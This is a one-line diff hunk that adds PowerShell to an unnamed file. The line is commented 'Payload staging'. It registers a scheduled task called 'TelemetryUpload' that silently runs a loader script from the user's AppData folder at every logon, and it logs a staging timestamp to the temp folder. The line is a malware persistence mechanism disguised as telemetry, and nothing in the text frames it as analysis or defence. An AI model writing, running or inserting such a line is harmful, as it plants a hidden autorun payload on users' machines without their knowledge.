@@ -1,0 +1,1 @@
+<# Payload staging #> schtasks.exe /Create /TN "TelemetryUpload" /TR "powershell.exe -NoP -File `"$env:APPDATA\loader.ps1`"" /SC ONLOGON /F; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $ProgressPreference = "SilentlyContinue"
